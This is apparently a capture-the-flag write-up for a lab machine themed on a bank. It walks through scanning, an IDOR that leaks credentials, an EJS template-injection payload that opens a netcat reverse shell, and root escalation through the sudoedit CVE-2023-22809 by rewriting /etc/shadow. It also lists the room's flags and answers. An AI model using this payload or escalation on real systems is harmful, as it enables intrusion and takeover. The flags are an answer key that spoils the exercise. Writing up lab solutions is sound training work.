**Q:** What's Tyrell Wellick's phone number?<br>
**A:** 842-029-5701<br>
1. nmap scan shows, port 22 and 80 are open
2. navigate to port 80 via browser, shows domain cyprusbank.thm (add to /etc/hosts)
3. cyprusbank.thm didnt show much, so with gobuster vhost found subdomain admin.cyprusbank.thm (add to /etc/hosts)
4. creds that was given `Olivia Cortez:olivi8` worked there.
5. navigate to "messages" and at url can be seen http://admin.cyprusbank.thm/messages/?c=5 , tryed to lower the parameter 'c' and at 0 it showed `Gayle Bev:p~]P@5!6;rs558:q`
6. logged in as Gayle Bev and phones numbers can be seen.

**Q:** User flag?<br>
**A:** THM{4lways_upd4te_uR_d3p3nd3nc!3s} <br>
1. after entering as Gayle Bev, the 'settings' tab on the site can be accessable.
2. via burp-suite repeater I've played abit with the request, and it doesnt actually changes the user's password, so i tryed to delete the parameter of 'password' and it reveals some embeded js files (EJS).
3. Via google, found SSTI for EJS, and the payload looked like this: (had to use BusyBox since my nc and target's nc didnt match verions and without it, i couldnt execute commands)
  name=1&settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('busybox nc <IP> 1234 -e /bin/sh');
4. logged in as user 'web' and it had the flag in hes home dir.

**Q:** root flag?<br>
**A:** THM{4nd_uR_p4ck4g3s} <br>
1. upgraded shell via python3 and stty raw...
2. sudo -l , revealed the user can execute without pass this:<br>
>sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
3. searched exploit for sudoedit 1.9.12p1, found this usefull:<br>
>https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis
4. export EDITOR="nano -- /etc/shadow"
5. (on my kali) openssl passwd -6 <new pass for root>
6. run "sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm" 
7. replaced root's password and did 'su root' (with my new pass) 
